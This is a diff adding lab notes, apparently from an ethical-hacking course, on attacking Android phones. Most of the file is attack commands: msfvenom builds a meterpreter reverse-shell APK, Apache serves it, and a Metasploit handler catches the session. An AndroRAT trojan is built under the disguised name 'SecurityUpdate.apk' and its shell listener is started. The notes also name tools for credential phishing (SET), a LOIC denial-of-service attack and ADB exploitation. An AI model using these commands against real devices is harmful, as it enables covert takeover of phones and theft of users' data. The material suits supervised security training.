@@ -1,0 +1,69 @@
+Exploit the vulnerabilities in an Android device
+Obtain users’ credentials
+Hack Android device with a malicious application
+Use an Android device to launch a DoS attack on a target
+Exploit an Android device through ADB
+Perform a security assessment on an Android device
+
+Hack android devices
+
+Hack an Android device by creating binary payloads using Parrot Security
+	• Harvest users’ credentials using the Social-Engineer Toolkit
+	• Launch a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform
+	• Exploit the Android platform through ADB using PhoneSploit
+	• Hack an Android device by creating APK file using AndroRAT
+	• Secure Android Devices using Various Android Security Tools
+
+	• Analyze a malicious app using online Android analyzers
+	• Secure Android devices from malicious apps using Malwarebytes Security
+
+
+Hack an Android Device by Creating Binary Payloads using Parrot Security
+	•  msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk 
+	• This command creates an APK (Backdoor.apk) on Desktop under the Root directory. In this case, 10.10.1.13 is the IP address of the Parrot Security machine.
+	• Type mkdir /var/www/html/share and press Enter to create a shared folder
+	• Type chmod -R 755 /var/www/html/share and press Enter
+	• Type chown -R www-data:www-data /var/www/html/share and press Enter
+	•  service apache2 start
+
+	• Msfconsole
+	• use exploit/multi/handler
+	• set payload android/meterpreter/reverse_tcp
+	• set LHOST 10.10.1.13
+	• Set LPORT 4444
+	• exploit -j -z 
+
+	• sessions -i 1
+	• sysinfo and press Enter
+
+Harvest Users’ Credentials using the Social-Engineer Toolkit
+
+./setoolkit and press Enter to launch Social-Engineer Toolkit.
+
+
+Launch a DoS Attack on a Target machine using Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform
+
+
+Exploit the Android Platform through ADB using PhoneSploit
+python3 -m pip install colorama
+python3 phonesploit.py
+
+
+Hack an Android Device by Creating APK File using AndroRAT
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+	• --build: is used for building the APK
+	• -i: specifies the local IP address (here, 10.10.1.13)
+	• -p: specifies the port number (here, 4444)
+	• -o: specifies the output APK file (here, SecurityUpdate.apk)
+Share the file using webserver 
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+--shell: is used for getting the interpreter
+-i: specifies the IP address for listening (here, 0.0.0.0)
+-p: specifies the port number (here, 4444)
+
+
+Analyze a Malicious App using Online Android Analyzers
+type https://www.sisik.eu/apk-tool
+
+
+Secure Android Devices from Malicious Apps using Malwarebytes Security
